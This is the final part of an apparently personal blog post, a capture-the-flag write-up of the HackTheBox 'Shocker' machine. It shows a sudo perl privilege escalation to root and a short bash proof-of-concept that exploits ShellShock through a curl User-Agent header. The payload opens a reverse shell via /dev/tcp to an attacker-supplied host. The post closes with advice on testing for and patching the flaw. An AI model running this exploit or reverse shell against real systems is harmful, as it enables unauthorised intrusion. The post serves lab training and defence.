+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;root
+&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+Linux Shocker 4.4.0-96-generic &lt;span class=&quot;c&quot;&gt;#119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Alright, now we’re talking. We don’t have a &lt;em&gt;pretty&lt;/em&gt; shell but we’re root! And it was pretty easy too. And there we have it, we’ve exploited the machine and obtained root permissions, from here we can read the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/shelly/user.txt&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; and get our whole 0 points from HackTheBox!&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+shelly@Shocker:/usr/lib/cgi-bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'exec &quot;/bin/bash&quot;;'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'exec &quot;/bin/bash&quot;;'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;root
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/shelly/user.txt
+13f51b&amp;lt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; REDACTED &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt  
+b1fd49&amp;lt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; REDACTED &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;super-basic-poc&quot;&gt;Super basic POC&lt;/h1&gt;
+&lt;hr /&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Super Basic POC Exploit code for HackTheBox Shocker&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Utilizes the ShellShock exploit&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Author: Brad Roberts&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$# &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-lt&lt;/span&gt; 2 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;then
+    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Usage: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; [LHOST&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; [LPORT]&quot;&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
+&lt;span class=&quot;k&quot;&gt;fi
+
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;TARGET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.56/cgi-bin/user.sh&quot;&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;PAYLOAD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; 0&amp;gt;&amp;amp;1'&quot;&lt;/span&gt;
+
+curl &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User-Agent: () { :; }; echo; echo; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PAYLOAD&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TARGET&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;im-vulnerable-to-shellshock-how-do-i-fix-this&quot;&gt;I’m vulnerable to ShellShock, how do I fix this?&lt;/h1&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;First off, your webpage might just be vulnerable to OS Injection that happens to look like ShellShock. It’s prolly vulnerable but just to be sure, double check by running the following:&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;env val='() { :; }; echo VULNERABLE' bash -c &quot;echo Hello World&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;If you see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VULNERABLE&lt;/code&gt; then, you guessed it…&lt;/p&gt;
+
+&lt;p&gt;This is a vulnerability in bash itself so to fix this, you’ll have to update bash.&lt;/p&gt;
+
+&lt;p&gt;Update with apt:&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo apt-get update &amp;amp;&amp;amp; sudo apt-get install --only-upgrade bash&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Update with yum:&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo yum update bash&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Good rule of thumb is to always stay up-to-date on patches!&lt;/p&gt;</content><author><name>Brad Roberts</name></author><category term="HTB" /><summary type="html">Difficulty: Easy Operating System: Linux IP Address: 10.10.10.56 Exploit: ShellShock Escalation: sudo /usr/bin/perl</summary></entry></feed>
